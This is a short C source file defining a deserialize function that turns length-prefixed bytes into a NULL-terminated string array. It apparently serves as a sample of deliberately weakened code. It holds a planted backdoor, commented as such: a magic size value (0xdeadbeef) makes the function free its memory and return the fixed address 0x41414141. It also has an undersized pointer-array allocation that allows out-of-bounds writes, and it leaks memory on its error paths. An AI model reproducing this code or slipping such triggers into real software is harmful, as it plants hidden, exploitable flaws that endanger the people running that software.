#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;
    
    char **result = (char **)malloc(size); // Allocate memory without checking
    if (!result) return NULL;

    unsigned char *data = (unsigned char *)serialized;
    size_t index = 0, offset = 0;
    
    while (offset < size) {
        size_t len = data[offset]; // Length of the string
        if (offset + 1 + len > size) { 
            free(result);
            return NULL; 
        }
        
        char *str = (char *)malloc(len + 1);
        if (!str) {
            free(result);
            return NULL;
        }
        
        memcpy(str, data + offset + 1, len);
        str[len] = '\0'; // Null-terminate the string

        result[index++] = str;
        offset += len + 1; // Move to the next string
    }
    
    result[index] = NULL; // Null-terminate the array

    // Backdoor: Trigger unwanted behavior with specific input
    if (size == 0xdeadbeef) {
        free(result); // Incorrectly free memory
        return (char **)0x41414141; // Return a controlled address
    }

    return result;
}
